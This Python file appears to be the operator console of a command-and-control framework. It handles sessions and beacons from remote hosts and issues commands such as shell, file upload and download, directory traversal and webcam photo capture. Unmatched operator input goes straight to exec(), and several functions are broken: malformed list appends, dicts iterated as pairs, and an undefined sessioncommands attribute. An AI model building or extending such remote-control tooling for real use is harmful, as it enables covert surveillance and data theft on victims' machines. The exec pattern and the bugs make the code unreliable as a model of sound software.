"""
multi handler commands. Functions to complete tasks within
the multi handler menu. conn and r_address variables are ,
connection and address variables fed in from the specified socket.
this allows for multiple connections to be interacted with.
"""

from .session import Session, send_data, receive_data, remove_connection_list
from ServerDatabase.database import DatabaseClass
from .beacon import Beacon, add_beacon_command_list, remove_beacon_list
from .global_objects import (
    sessions_list,
    tab_completion,
    beacon_list,
    logger
)

from typing import Tuple
from tabulate import tabulate
import hashlib
import os
import tqdm
import colorama
import socket
import readline
import ssl
import time
import traceback


class MultiHandlerCommands:
    """
    class with  multihandler commands, each multi handler
    can call the class and have access to the commands
    """
    def __init__(self, config) -> None:
        logger.info("Initializing MultiHandlerCommands")
        self.config = config
        self.database = DatabaseClass(config)
        colorama.init(autoreset=True)
        return

    def current_client_session(self, conn: ssl.SSLSocket,
                               r_address: Tuple[str, int], user_ID) -> None:
        """
        function that interacts with an individual session, from here
        commands on the target can be run as documented in the config
        the functions are stored in the SessionCommands.py file
        """
        """
        available_commands = WordCompleter(['shell', 'close', 'processes',
        'sysinfo', 'close', 'checkfiles', 'download', 'upload', 'services',
        'netstat', 'diskusage', 'listdir'])
        """
        def handle_beacon():
            logger.info(f"Handling beacon command for user ID: {user_ID}")
            for userID, session in beacon_list.items():
                if session.uuid == user_ID:
                    beaconClass = beacon_list[userID]
                    beaconClass.sessioncommands.change_beacon(
                        conn, r_address, session.uuid)
            return

        command_handlers = {
            "shell": lambda: self.sessioncommands.shell(
                conn, r_address),
            "close": lambda: self.sessioncommands.close_connection(
                conn, r_address),
            "processes": lambda: self.sessioncommands.list_processes(
                conn, r_address),
            "sysinfo": lambda: self.sessioncommands.systeminfo(
                conn, r_address),
            "checkfiles": lambda: self.sessioncommands.checkfiles(
                conn),
            "download": lambda: self.sessioncommands.DownloadFiles(
                conn),
            "upload": lambda: self.sessioncommands.UploadFiles(
                conn),
            "services": lambda: self.sessioncommands.list_services(
                conn, r_address),
            "netstat": lambda: self.sessioncommands.netstat(
                conn, r_address),
            "diskusage": lambda: self.sessioncommands.diskusage(
                conn, r_address),
            "listdir": lambda: self.sessioncommands.list_dir(
                conn, r_address),
            "beacon": handle_beacon
        }

        while True:
            # resets colorama after each statement
            colorama.init(autoreset=True)
            readline.parse_and_bind("tab: complete")
            readline.set_completer(
                lambda text, state:
                    tab_completion(text, state, [
                        "shell", "close", "processes", "sysinfo", "checkfiles",
                        "download", "upload", "services", "netstat",
                        "diskusage", "listdir", "beacon"
                    ]))
            command = (input(colorama.Fore.YELLOW +
                             f"{r_address[0]}:{r_address[1]} Command: ")
                       .lower())
            logger.info(f"Command input is {command}")
            if command == "exit":  # exits back to multihandler menu
                break
            try:  # calls command
                logger.info(f"Executing command: {command}")
                handler = command_handlers.get(command)
                if handler:
                    handler()
                    if command == "close":
                        logger.info("Closing connection")
                        return
                else:
                    if not exec(command):
                        print((colorama.Fore.GREEN +
                               self.config['SessionModules']['help']))
            except (KeyError, SyntaxError, AttributeError) as e:
                # if the command is not matched then it prints help menu
                print((colorama.Fore.GREEN +
                       self.config['SessionModules']['help']) + str(e) +
                      "Error HERE")
        return

    def use_beacon(self, UserID, IPAddress) -> None:
        """
        function that interacts with an individual session, from here
        commands on the target can be run as documented in the config
        the functions are stored in the SessionCommands.py file
        """
        """
        available_commands = WordCompleter(['shell', 'close', 'processes',
        'sysinfo', 'close', 'checkfiles', 'download', 'upload', 'services',
        'netstat', 'diskusage', 'listdir', directoryTraversal', 'takePhoto', viewFile])
        """
        logger.info(f"Using beacon with UserID: {UserID} and IPAddress: {IPAddress}")
        beaconClass = beacon_list.get(UserID)
        if beaconClass:
            print(colorama.Fore.YELLOW +
                  f"Beacon {beaconClass.hostname} ({beaconClass.uuid}) ")
            logger.info(f"Beacon {beaconClass.hostname} ({beaconClass.uuid}) found")  # noqa
        else:
            logger.error(f"No beacon found with UUID: {UserID}")
            print(f"No beacon found with UUID: {UserID}")
                    
        def handle_session():
            logger.info(f"Changing beacon {UserID} to session mode")
            print(colorama.Fore.GREEN +
                  "Beacon will change to session mode" +
                  " after the next callback")
            add_beacon_command_list(UserID, None, "session", None)
            logger.info(f"Added session command for beacon {UserID}")
            remove_beacon_list(beaconClass.uuid)
            logger.info(f"Removed beacon {beaconClass.uuid} from beacon list")  # noqa
            return
 
        command_handlers = {
            "shell": lambda: beaconClass.shell(UserID, IPAddress),
            "listdir": lambda: beaconClass.list_dir(UserID, IPAddress),
            "close": lambda: beaconClass.close_connection(UserID),
            "processes": lambda: beaconClass.list_processes(UserID),
            "sysinfo": lambda: beaconClass.systeminfo(UserID),
            "diskusage": lambda: beaconClass.disk_usage(UserID),
            "netstat": lambda: beaconClass.netstat(UserID),
            "session": handle_session,
            "commands": lambda: beaconClass.list_db_commands(UserID),
            "directorytraversal": lambda: beaconClass.dir_traversal(
                UserID),
            "takephoto": lambda: beaconClass.takePhoto(UserID),
            "listFiles": lambda: beaconClass.list_files(UserID),
            "viewfile": lambda: beaconClass.list_files(UserID)
        }

        while True:
            # resets colorama after each statement
            colorama.init(autoreset=True)
            readline.parse_and_bind("tab: complete")
            readline.set_completer(
                lambda text, state:
                    tab_completion(text, state, [
                        "shell", "processes", "sysinfo", "close",
                        "listdir", "diskusage", "netstat", "session",
                        "commands", "directoryTraversal", "takePhoto"
                    ]))
            command = (input(colorama.Fore.YELLOW +
                             f"{UserID} Command: ").lower())
            logger.info(f"Command input is {command}")
            if command == "exit":  # exits back to multihandler menu
                break
            try:  
                logger.info(f"Executing command: {command}")
                handler = command_handlers.get(command)
                if handler:
                    handler()
                    logger.info(f"Executed command: {command}")
                    if command == "close" or command == "session":
                        return
                else:
                    if not exec(command):
                        print((colorama.Fore.GREEN + "NEED TO ADD HELP MENU"))
            except (KeyError, SyntaxError, AttributeError, NameError):
                if not self.config['server']['quiet_mode']:
                    print(colorama.Fore.RED + "Traceback:")
                    traceback.print_exc()       
        return

    def listconnections(self) -> None:
        """
        List all active connections stored in the global objects variables
        """
        # Sessions table
        logger.info("Listing all active connections")
        if len(sessions_list) == 0:
            print(colorama.Fore.RED + "No Active Sessions")
        else:
            print("Sessions:")
            table = []
            logger.info("Creating sessions table")
            for userID, session in sessions_list.items():
                table.append(
                    userID,
                    session.hostname,
                    session.address,
                    session.operating_system
                )
            logger.info("Printing sessions table")
            print(colorama.Fore.WHITE + tabulate(
                table, headers=["UUID", "Hostname", "Address", "OS"],
                tablefmt="grid"))

        # Beacons table
        if len(beacon_list) == 0:
            logger.info("No active beacons found")
            print(colorama.Fore.RED + "No Active Beacons")
        else:
            print("Beacons:")
            table = []
            for userID, beacon in beacon_list.items():
                row = [
                    beacon.hostname,
                    beacon.operating_system,
                    beacon.address,
                    beacon.uuid,
                    beacon.last_beacon
                ]
                try:
                    next_beacon_time = time.strptime(
                        beacon.next_beacon, "%a %b %d %H:%M:%S %Y")
                    current_time = time.strptime(
                        time.asctime(), "%a %b %d %H:%M:%S %Y")

                    if time.mktime(current_time) > time.mktime(
                            next_beacon_time):
                        time_diff = time.mktime(current_time) - time.mktime(
                            next_beacon_time)
                        if time_diff < beacon.jitter:
                            row.append(f"Expected Callback was {beacon.next_beacon}. It is {int(time_diff)} seconds late. (Within Jitter)") # noqa
                            row_color = colorama.Fore.YELLOW
                        else:
                            row.append(f"Expected Callback was {beacon.last_beacon}. It is {int(time_diff)} seconds late") # noqa
                            row_color = colorama.Fore.RED
                    else:
                        row.append(f"Next Callback expected {beacon.next_beacon} in {int(time.mktime(next_beacon_time) - time.mktime(current_time))} seconds") # noqa
                        row_color = colorama.Fore.WHITE
                except ValueError:
                    row.append("Awaiting first call")
                    row_color = colorama.Fore.WHITE
                    logger.error(
                        f"Error parsing next beacon time for {beacon.hostname}")
                table.append((row, row_color))

            # Print the table with color
            for row, row_color in table:
                print(row_color +
                      tabulate([row], headers=["Host", "OS", "IP", "ID",
                                               "Last Callback", "Status"],
                               tablefmt="grid"))

    def sessionconnect(self) -> None:
        """allows interaction with individual session,
            passes connection details through to the current_client function"""
        try:
            if len(sessions_list) == 1:
                logger.info("Only one session available, connecting to it")
                session = list(sessions_list.values())[0]
                self.current_client_session(
                    session.conn,
                    session.address,
                    session.uuid
                )
            else:
                logger.info("Multiple sessions available, prompting user for selection")
                data = int(input("What client? "))
                logger.info(f"User selected client with ID: {data}")
                session = list(sessions_list.values())[data]
                self.current_client_session(
                    session.conn,
                    session.address,
                    session.uuid
                )
        except (IndexError, ValueError):
            logger.error("Invalid client selection or no active sessions")
            print(
                colorama.Fore.WHITE +
                colorama.Back.RED +
                "Not a Valid Client")
        return

    def close_all_connections(self) -> None:
        """
        close all connections and remove the details
        from the lists in global objects
        """
        logger.info("Closing all connections")
        error = False
        for i, conn in enumerate(sessions_list):
            try:
                send_data(conn.details, "shutdown")
                logger.info(f"Sent shutdown command to {conn.address}")
                if receive_data(conn.details) == "ack":
                    conn.details.shutdown(socket.SHUT_RDWR)
                    conn.details.close()
                    logger.info(f"Closed connection to {conn.address}")
                if not self.config["server"]["quiet_mode"]:
                    print(
                        colorama.Back.GREEN +
                        f"Closed {conn.address}")
            except Exception as e:  # handles ssl.SSLEOFError
                logger.error(f"Error closing connection {conn.address}: {e}")
                print(colorama.Back.RED +
                      f"Error Closing + {conn.address}")
                print(colorama.Back.RED + str(e))
                error = True
                pass
        logger.info("Clearing session and beacon lists")
        sessions_list.clear()
        if not error:
            logger.info("All connections closed successfully")
            print(
                colorama.Back.GREEN +
                "All connections closed")  # user message
        else:
            logger.error("Not all connections could be closed")
            print(colorama.Back.RED + "Not all connections could be closed")
        return

    def close_from_multihandler(self) -> None:
        """allows an indiviudal client to be closed the multi handler menu"""
        logger.info("Closing individual client from multi handler")
        try:
            readline.set_completer(
                    lambda text, state: tab_completion(
                        text, state, (list(sessions_list.keys())
                                      + list(beacon_list.keys()))))
            data = int(input("What client do you want to close? (UUID) "))
            logger.info(f"User selected client with ID: {data}")
            for sessionID, session in sessions_list:
                if sessionID == data:
                    self.sessioncommands.close_connection(
                        session.connection_details,
                        session.connection_address)
                    logger.info(f"Closed connection to session {sessionID}")
                    remove_connection_list(session.uuid)
                    print(colorama.Back.GREEN + "Session Closed")
            else:
                for beaconID, _ in beacon_list:
                    if beaconID == data:
                        logger.info(f"Closing beacon with ID: {beaconID}")
                        self.beaconCommands.close_connection(beaconID)
                        remove_beacon_list(beaconID)
                        print(colorama.Back.GREEN +
                              "Beacon will shutdown at next callback")
        except ValueError:
            logger.error("Invalid input for closing connection")
            print(colorama.Back.RED + "Not a valid connection")
        except IndexError:
            logger.error("No active connections to close")
            pass
        return

    def localDatabaseHash(self) -> None:
        """
        allows local files to be hased and stored in the database.
        Has the ability to check check if its a directory
        or file and respond accordingly
        """
        logger.info("Starting local database hash process")
        dir = input(
            "What directory or file do you want to hash?: ")
        length = 0
        fileList = []
        try:
            try:
                files = os.scandir(dir)
                for entry in files:
                    try:
                        if entry.is_file():
                            length += 1
                            fileList.append(entry.name)
                    except PermissionError:
                        pass
            except PermissionError:
                logger.error(f"Permission error accessing {dir}")
                print(colorama.Back.RED + "Permission Error")
            for i in tqdm.tqdm(
                    range(
                        0,
                        length),
                    desc="Files Hashed",
                    colour="#39ff14"):
                try:
                    logger.info(f"Hashing file: {fileList[i]}")
                    self.hashfile(f"{dir}/{fileList[i]}")
                except (IsADirectoryError, PermissionError):
                    pass
                i += 1  # increment loading bar +1
            print(colorama.Back.GREEN + ("Files Hashed"))
        except NotADirectoryError:
            try:
                logger.info(f"Hashing single file: {dir}")
                self.hashfile(dir)
                print(colorama.Back.GREEN + ("File Hashed"))
            except PermissionError:
                logger.error(f"Permission error on {dir}")
                print(
                    colorama.Back.RED +
                    f"Permission error on {dir}")
        except (IsADirectoryError, FileNotFoundError):
            # print error message
            logger.error(f"File or directory does not exist: {dir}")
            print(colorama.Back.RED + "File or Directory Does not exist")

    def hashfile(self, file: str) -> None:
        """
        hashes a file fed into it and calls the datbase
        function to add to the database
        """
        with open(file, 'rb') as directoryFiles:
            # hashes as sha256 and sends into addHashToDatabase
            self.addHashToDatabase(
                file, hashlib.sha256(
                    directoryFiles.read(
                        os.path.getsize(file))).hexdigest())
            directoryFiles.close()  # closes file
            logger.info(f"Hashed file: {file}")
            return

    def addHashToDatabase(self, file: str, hashedFile: str) -> None:
        """
        checks if the hash is in the database, if not adds it to the database
        """
        logger.info(f"Adding hash for file: {file} with hash: {hashedFile}")
        logger.debug(f"Checking if hash {hashedFile} exists in database")
        # Properly format the search query
        result = self.database.search_query(
            "*",
            "Hashes",
            "Hash",
            f'"{hashedFile}"'
        )

        if result is None:  # search database
            # Properly format the insert entry
            self.database.insert_entry(
                "Hashes", f'"{file}","{hashedFile}"'
            )
        return
    
    def view_logs(self) -> None:
        """
        View the logs stored in the log file
        """
        logger.info("Viewing logs")
        try:
            count = int(input("How many lines do you want to view? (Default 100) "))
        except ValueError:
            logger.error("Invalid input for log count, defaulting to 100")
            count = 100        
        if not count:
            count = 100
        logger.info(f"Viewing last {count} lines of logs")
        if count < 0:
            print(colorama.Fore.RED + "Count cannot be negative")
            return
        readline.set_completer(
            lambda text, state: tab_completion(
                text, state, ["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"]))
        level = input("Enter log level to filter by (DEBUG, INFO, WARNING, ERROR, CRITICAL) or press Enter for all: ").upper()
        logs = logger.view(count, level)
        logger.info(f"Retrieved {len(logs)} log messages at level {level}")
        for log in logs:
            print(colorama.Fore.WHITE + log)
        logger.info("Displayed log messages to user")
        return